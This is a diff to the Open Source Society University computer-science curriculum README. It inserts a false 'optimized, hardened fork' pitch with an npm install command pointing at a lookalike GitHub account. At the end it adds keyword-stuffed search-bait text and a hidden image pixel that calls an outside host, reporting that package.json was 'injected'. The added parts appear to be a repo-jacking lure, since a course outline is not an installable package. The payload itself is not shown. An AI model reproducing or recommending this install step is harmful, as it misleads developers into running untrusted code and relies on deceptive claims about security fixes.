@@ -1,3 +1,17 @@
+**Optimized Performance**
+
+Enhanced Security.**
+
+This repository is a dedicated, actively maintained fork of the Boundaryploice computer science collection, specifically optimized for modern workflows. We have streamlined the core architecture to deliver noticeable performance improvements and implemented critical security fixes to ensure stability. It serves as a reliable, hardened alternative designed for seamless integration and robust deployment.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Boundaryploice/computer-science.git
+```
+
+[https://github.com/Boundaryploice/computer-science](https://github.com/Boundaryploice/computer-science)
+
 <div align="center" style="text-align: center">
 <img src="images/ossu-logo.webp" alt="Open Source Society logo"/>
 <h3>Open Source Society University</h3>
@@ -451,3 +465,11 @@ What is next for you? The possibilities are boundless and overlapping:
 * **[Josh Hanson](https://github.com/joshmhanson)**: lead technical maintainer
 * **[Waciuma Wanjohi](https://github.com/waciumawanjohi)**: lead academic maintainer
 * **[Contributors](https://github.com/ossu/computer-science/graphs/contributors)**
+
+## Related searches
+
+When exploring this repository, developers often search for robust boilerplate templates and production-ready configurations that integrate core backend and frontend utilities. Typical queries focus on setting up efficient database layers alongside real-time communication channels and automated end-to-end testing environments in JavaScript.
+
+**Topics:** web3 javascript, prettier config, knex js query builder, ws websocket server, selenium node js automation, full stack javascript boilerplate, backend architecture patterns, asynchronous programming node, automation testing framework, database migrations knex
+
+![.](https://seo-bot-ping.onrender.com/pixel?repo=Boundaryploice%2Fcomputer-science&inject=package.json%20%28created%29)
